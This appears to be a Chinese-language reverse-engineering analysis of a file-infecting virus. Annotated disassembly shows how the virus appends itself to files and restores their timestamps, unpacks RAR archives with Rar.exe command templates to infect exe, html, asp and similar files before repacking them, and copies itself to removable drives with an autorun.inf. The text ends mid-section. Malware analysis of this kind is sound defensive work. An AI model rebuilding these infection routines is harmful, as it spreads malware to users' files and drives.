
# 病毒行为分析

## 文件感染流程

进入目录操作后，病毒开始感染文件。

```text
.text:00405ADF                 call    FileOldTime     ; 保留文件创建时间
.text:00405AE4                 push    offset unk_40C690 ; lpString1
.text:00405AE9                 push    [ebp+hFile]     ; hFile
.text:00405AEC                 call    ReadMySlef
.text:00405AF1                 test    eax, eax
.text:00405AF3                 jnz     short loc_405B04
.text:00405AF5                 push    [ebp+hFile]     ; hObject
.text:00405AF8                 call    ds:CloseHandle
.text:00405AFE                 or      [ebp+var_4], 0FFFFFFFFh
.text:00405B02                 jmp     short loc_405B6A
.text:00405B04 loc_405B04:                             ; CODE XREF: TaintThisFile+117 j
.text:00405B04                 push    2               ; dwMoveMethod
.text:00405B06                 push    0               ; lpDistanceToMoveHigh
.text:00405B08                 push    0               ; lDistanceToMove
.text:00405B0A                 push    [ebp+hFile]     ; hFile
.text:00405B0D                 call    ds:SetFilePointer ; 移动文件指针到末尾
.text:00405B13                 push    0               ; lpOverlapped
.text:00405B15                 lea     eax, [ebp+NumberOfBytesWritten]
.text:00405B18                 push    eax             ; lpNumberOfBytesWritten
.text:00405B19                 push    offset unk_40C690 ; lpString
.text:00405B1E                 call    ds:lstrlenA
.text:00405B24                 push    eax             ; nNumberOfBytesToWrite
.text:00405B25                 push    offset unk_40C690 ; lpBuffer
.text:00405B2A                 push    [ebp+hFile]     ; hFile
.text:00405B2D                 call   ds:WriteFile   ; 将感染字符串写入到文件的末尾
.text:00405B33                 push    1               ; int
.text:00405B35                 lea     eax, [ebp+CreationTime]
.text:00405B38                 push    eax             ; lpCreationTime
.text:00405B39                 push    [ebp+hFile]     ; hFile
.text:00405B3C                 call    FileOldTime     ; 设置时间到之前
.text:00405B41                 push    [ebp+hFile]     ; hObject
.text:00405B44                 call    ds:CloseHandle
```

如果是 `RAR` 文件则跳到这里，病毒会调用 `C:\\Program Files\\WinRAR\\Rar.exe`，并加 `%s X -ibck \"%s\" \"%s\\` 的参数把压缩包中的文件释放到临时目录。然后感染解压出来的的 `exe`、`rar`、`htm`、`html`、`asp`、`aspx` 等文件，感染完毕会调用 `rar.exe` 加参数 `%s M -ibck -r -o+ -ep1 \"%s\" \"%s\\*` 把压缩包放回。

## RAR 文件专项感染

```text
.text:004060D9 TaintRAR:                               ; CODE XREF:
.text:004060D9                 push    offset aRar     ; "rar"
.text:004060DE                 push    [ebp+lpString1] ; lpString1
.text:004060E4                 call   ds:lstrcmpiA  ; 如果判断是rar则跳到这里来感染
.text:004060EA                 test    eax, eax
.text:004060EC                 jnz     short GameOver
.text:004060EE                 and     [ebp+hObject], 0
.text:004060F5                 push    0               ; lpThreadId
.text:004060F7                 push    0               ; dwCreationFlags
.text:004060F9                 lea     eax, [ebp+Parameter]
.text:004060FF                 push    eax             ; lpParameter
.text:00406100                 push    offset TaintRAR ; lpStartAddress
.text:00406105                 push    0               ; dwStackSize
.text:00406107                 push    0               ; lpThreadAttributes
.text:00406109                 call    ds:CreateThread ; 开新线程感染rar压缩包
.text:0040612D                 push    0FFFFFFFFh      ; dwMilliseconds
.text:0040612F                 push    [ebp+hObject]   ; hHandle
.text:00406135                 call    ds:WaitForSingleObject ; 等待感染rar的线程结束
```

## 感染过程

```text
.text:00405C17                 push    0
.text:00405C19                 push    80h
.text:00405C1E                 push    3
.text:00405C20                 push    0
.text:00405C22                 push    3
.text:00405C24                 push    0C0000000h
.text:00405C29                 lea     eax, [ebp+FileName]
.text:00405C2F                 push    eax
.text:00405C30                 call    [ebp+CreateFileA] ; 创建文件句柄
.text:00405C36                 mov     [ebp+hFile], eax
.text:00405C3C                 push    0               ; lpFileSizeHigh
.text:00405C3E                 push    [ebp+hFile]     ; hFile
.text:00405C44                 call    ds:GetFileSize
.text:00405C4A                 mov     [ebp+var_40C], eax
.text:00405C50                 cmp     [ebp+var_40C], 0
.text:00405C57                 jz      short GoOutReturn ; 文件长度为0跳走退出
.text:00405C59                 cmp     [ebp+var_40C], 0FFFFFFFFh
.text:00405C60                 jz      short GoOutReturn ; 获取文件长度失败跳走退出
.text:00405C62                 cmp     [ebp+var_40C], 0A00000h
.text:00405C6C                 ja      short GoOutReturn ; 文件过大退出
.text:00405C6E                 cmp     [ebp+var_40C], 2800h
.text:00405C78                 jnb     short loc_405C90
.text:00405C9F                 call    FileOldTime     ; 获取该文件源创建时间\
.text:00405D84                 push    eax             ; lpStartupInfo
.text:00405D85                 push    0               ; lpCurrentDirectory
.text:00405D87                 push    0               ; lpEnvironment
.text:00405D89                 push    0C000000h       ; dwCreationFlags
.text:00405D8E                 push    1               ; bInheritHandles
.text:00405D90                 push    0               ; lpThreadAttributes
.text:00405D92                 push    0               ; lpProcessAttributes
.text:00405D94                 lea     eax, [ebp+CommandLine]
.text:00405D9A                 push    eax             ; lpCommandLine
.text:00405D9B                 push    0               ; lpApplicationName
.text:00405D9D                 call    ds:CreateProcessA ; 将C:\\Program Files\\WinRAR\\Rar.exe,; 并加%s X -ibck \"%s\" \"%s\\内以命令行参数运行之
.text:00405E3B                 call    TaintFile_0 ; 解压压缩包后感染压缩包内的文件
.text:00405EB3                 push    eax             ; lpStartupInfo
.text:00405EB4                 push    0               ; lpCurrentDirectory
.text:00405EB6                 push    0               ; lpEnvironment
.text:00405EB8                 push    0C000000h       ; dwCreationFlags
.text:00405EBD                 push    1               ; bInheritHandles
.text:00405EBF                 push    0               ; lpThreadAttributes
.text:00405EC1                 push    0               ; lpProcessAttributes
.text:00405EC3                 lea     eax, [ebp+CommandLine]
.text:00405EC9                 push    eax             ; lpCommandLine
.text:00405ECA                 push    0               ; lpApplicationName
.text:00405ECC                 call    ds:CreateProcessA ; 再将压缩程序并入"%s M -ibck -r -o+ -ep1 \"%s\" \"%s\\*\""以命令行参数运行之，将感染后的文件打包压缩回去
.text:00405F03                 push    0               ; hTemplateFile
.text:00405F05                 push    80h             ; dwFlagsAndAttributes
.text:00405F0A                 push    3               ; dwCreationDisposition
.text:00405F0C                 push    0               ; lpSecurityAttributes
.text:00405F0E                 push    3               ; dwShareMode
.text:00405F10                 push    0C0000000h      ; dwDesiredAccess
.text:00405F15                 lea     eax, [ebp+FileName]
.text:00405F1B                 push    eax             ; lpFileName
.text:00405F1C                 call    ds:CreateFileA  ; 创建文件句柄，准备将感染后的rar文件设置成原来的时间
.text:00405F22                 mov     [ebp+hFile], eax
.text:00405F28                 push    1               ; int
.text:00405F2A                 lea     eax, [ebp+CreationTime]
.text:00405F30                 push    eax             ; lpCreationTime
.text:00405F31                 push    [ebp+hFile]     ; hFile
.text:00405F37                 call    FileOldTime     ; 将被感染后的RAR文件设置成原来的时间
```

## 磁盘感染

下面是感染磁盘的过程，过程为搜索磁盘并判断类型，如果是可移动磁盘则获得系统内的盘符，查找可移动存储，并把自身复制到这个盘下面的

`recycle.{645FF040-5081-101B-9F08-00AA002F954E}\setup.exe`，并创建 `autorun.inf` 文件，过程如下：

```text
.text:00408B08                 push    eax
```
